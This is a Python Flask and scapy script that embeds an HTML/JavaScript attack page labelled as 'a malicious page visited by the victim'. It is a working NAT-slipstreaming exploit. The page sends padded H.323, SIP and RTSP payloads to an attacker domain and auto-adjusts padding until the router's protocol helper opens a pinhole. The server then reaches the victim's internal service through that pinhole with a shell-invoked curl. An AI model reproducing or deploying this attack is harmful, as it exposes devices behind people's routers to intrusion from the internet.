#!/usr/bin/env python3

import threading
import re
import ipaddress
import subprocess

from flask import request
from flask import Flask
from flask import jsonify
from flask_cors import CORS
from scapy.all import *

offsets = {}
condition = threading.Condition()
PAYLOAD_START = b'\x03\x00\x00\x3c\x08\x02\x8a\x9c\x62\x1c\x00\x7e\x00\x2e\x05\x26\xc0\x06\x00\x08\x91\x4a\x00\x07\x00'

PUNCH_HTML = '''
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PUNCH!</title>
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css"
        integrity="sha384-HSMxcRTRxnN+Bdg0JdbxYKrThecOKuH5zCYotlSAcp1+c8xmyTe9GYg1l9a69psu" crossorigin="anonymous">

    <!-- Optional theme -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap-theme.min.css"
        integrity="sha384-6pzBo3FDv/PJ8r2KRkGHifhEocL+1X2rVCTTkUfGk7/0pbek5mMa1upzvWbrUbOZ" crossorigin="anonymous">

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"
        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
    <!-- Latest compiled and minified JavaScript -->
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"
        integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd"
        crossorigin="anonymous"></script>
</head>

<body>
    <h1>This is a malicious page visited by the victim</h1>
    <form action="#">
        <label for="API_URL">API_URL</label>
        <input type="text" name="API_URL" id="API_URL" value="http://oembed.dev.ipwnedyour.net:1720">
        <label for="localip">LOCAL IP</label>
        <input type="text" name="localip" id="localip" value="192.168.0.1">
        <label for="PORT">PORT</label>
        <input type="number" name="port" id="port" value="80">
        <label for="padding">PADDING</label>
        <input type="number" name="padding" id="padding" value="9000">
        <label for="protocol">PAYLOAD</label>
        <select name="protocol" id="protocol">
            <option value="SIP">SIP</option>
            <option value="H323" selected>H323</option>
            <option value="RTSP">RTSP</option>
        </select>
        <button type="button" onclick="punch()" value="PUNCH!">PUNCH!</button>
    </form>
    <div>
        <textarea style="margin: 10px" name="response" id="response" cols="100" rows="40"></textarea>
    </div>
    <footer>
        <p>
            2021041200
        </p>
    </footer>
    <script charset="UTF-8">
        // Convert a hex string to a byte array
        function hexToBytes(hex) {
            for (var bytes = [], c = 0; c < hex.length; c += 2)
                bytes.push(parseInt(hex.substr(c, 2), 16));
            return bytes;
        }

        // Convert a byte array to a hex string
        function bytesToHex(bytes) {
            for (var hex = [], i = 0; i < bytes.length; i++) {
                var current = bytes[i] < 0 ? bytes[i] + 256 : bytes[i];
                hex.push((current >>> 4).toString(16));
                hex.push((current & 0xF).toString(16));
            }
            return hex.join("");
        }
        function ipToHex(ip) {
            octects = ip.split(".");
            result = "";
            result += parseInt(octects[0]).toString(16).padStart(2, '0');
            result += parseInt(octects[1]).toString(16).padStart(2, '0');
            result += parseInt(octects[2]).toString(16).padStart(2, '0');
            result += parseInt(octects[3]).toString(16).padStart(2, '0');
            return result;
        }
        function punch() {
            let padding = "";
            const API_URL = new URL(document.getElementById("API_URL").value);
            const PORT = document.getElementById("port").value;
            const PADDING = document.getElementById("padding").value;
            const LOCAL_IP = document.getElementById("localip").value;
            const PROTOCOL = document.getElementById("protocol").value;
            // H323_PAYLOAD = HEAD + IP + PORT + TAIL
            // c0a8007b = 192.168.0.123
            // 1f40 = 8000
            //const H323_PAYLOAD = "0300003c08028a9c621c007e002e0526c0060008914a000700"+"c0a8007b"+"1f40"+"22603011009c5b1a4e1a98eb1188be3464a92054580100010002800180";
            const H323_PAYLOAD = "0300003c08028a9c621c007e002e0526c0060008914a000700" + ipToHex(LOCAL_IP) + parseInt(PORT).toString(16) + "22603011009c5b1a4e1a98eb1188be3464a92054580100010002800180";
            const SIP_PAYLOAD = `REGISTER sip:${API_URL.hostname};transport=TCP SIP/2.0\r\nVia: SIP/2.0/TCP ${LOCAL_IP}:5060;branch=I9hG4bK-d8754z-c2ac7de1b3ce90f7-1---d8754z-;rport;transport=TCP\r\nMax-Forwards: 70\r\nContact: <sip:foo@${LOCAL_IP}:${PORT};rinstance=v40f3f83b335139c;transport=TCP>\r\nTo: <sip:bar@${API_URL.hostname};transport=TCP>\r\nFrom: <sip:foo@${API_URL.hostname};transport=TCP>;tag=U7c3d519\r\nCall-ID: aaaaaaaaaaaaa09921342194747119bbbbbbZjQ4M2M.\r\nCSeq: 1 REGISTER\r\nExpires: 70\r\nAllow: REGISTER, INVITE, ACK, CANCEL, BYE, NOTIFY, REFER, MESSAGE, OPTIONS, INFO, SUBSCRIBE\r\nSupported: replaces, norefersub, extended-refer, timer, X-cisco-serviceuri\r\nUser-Agent: foobar\r\nAllow-Events: presence, kpml\r\nContent-Length: 0\r\n\r\n`;
            const RTSP_PAYLOAD = `SETUP rtsp://${API_URL.hostname}:${API_URL.port}/mystream/trackID=0 RTSP/1.0\r\nCSeq: 1\r\nUser-Agent: LibVLC/3.0.9.2 (LIVE555 Streaming Media v2020.01.19)\r\nTransport: rtp/avp/tcp;client_port=${PORT}-${PORT + 1}\r\n\r\n`;
            let payload = "";
            switch (PROTOCOL) {
                case "H323":
                    for (let index = 0; index < PADDING; index++) {
                        padding += "41";
                    }
                    payload = new Uint8Array(hexToBytes(padding + H323_PAYLOAD));
                    document.getElementById("response").innerHTML = H323_PAYLOAD;
                    break;
                case "RTSP":
                    for (let index = 0; index < PADDING; index++) {
                        padding += "A";
                    }
                    payload = padding + RTSP_PAYLOAD;
                    break;
                default:
                    for (let index = 0; index < PADDING; index++) {
                        padding += "A";
                    }
                    payload = padding + SIP_PAYLOAD;
                    break;
            }
            let xhttp = new XMLHttpRequest();
            xhttp.onreadystatechange = function () {
                console.log(this);
                if (this.responseText && this.status === 200) {
                    let response = JSON.parse(this.responseText);
                    if (response.offset == 0) {
                        document.getElementById("response").innerHTML = response.body;
                    }
                    else {
                        let newPadding = parseInt(PADDING) - response.offset;
                        document.getElementById("response").innerHTML = `Adjusting new padding to ${newPadding}`;
                        document.getElementById("padding").value = newPadding;
                        punch();
                    }
                }
            };
            xhttp.open("POST", API_URL, true);
            xhttp.send(payload);
            console.log("Sent:", payload);
        }
    </script>
</body>

</html>
'''


def log_offsets(packet):
    try:
        if packet[TCP]:
            print("DEBUG:", bytes(packet[TCP].payload).hex())
            offset = bytes(packet[TCP].payload).find(PAYLOAD_START)
            if offset >= 0:
                with condition:
                    offsets[packet[0][1].src] = offset
                    print("OFFSET:", offsets[packet[0][1].src])
                    condition.notify()
    except:
        pass
    return ""


# Setup sniff, filtering for IP traffic
t = AsyncSniffer(filter="port 1720", prn=log_offsets)
t.start()


app = Flask(__name__)
CORS(app)


@app.route('/', methods=['POST'])
def register():
    with condition:
        condition.wait()
    if offsets[request.remote_addr] != 0:
        return jsonify({"offset": offsets[request.remote_addr], "body": ""})
    search = re.search(PAYLOAD_START+b'(....)(..)',
                       request.data, re.IGNORECASE)
    if search:
        ip_bytes = search.group(1)
        print(ip_bytes)
        ip = '{}.{}.{}.{}'.format(
            ip_bytes[0], ip_bytes[1], ip_bytes[2], ip_bytes[3])
        port = int.from_bytes(search.group(2), byteorder='big', signed=False)
        print("#", ip, port)
        if not ipaddress.ip_address(ip).is_private:
            try:
                output = subprocess.check_output(
                    "curl -i --connect-timeout 1 -X GET http://{}:{}/".format(ip, port), shell=True)
                print(output.decode('utf-8'))
                return jsonify({"offset": offsets[request.remote_addr], "body": output.decode('utf-8')}), 200
            except subprocess.CalledProcessError:
                print("curl failed")
                return "", 404
        else:
            print("ip is private")
            return "", 404
    else:
        print("search failed")
        return "", 404


@app.route('/', methods=['GET'])
def index():
    # with open('/var/www/html/punch.html', 'r') as f:
    #    response = f.read()
    # return response, 200
    return PUNCH_HTML, 200


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1720)
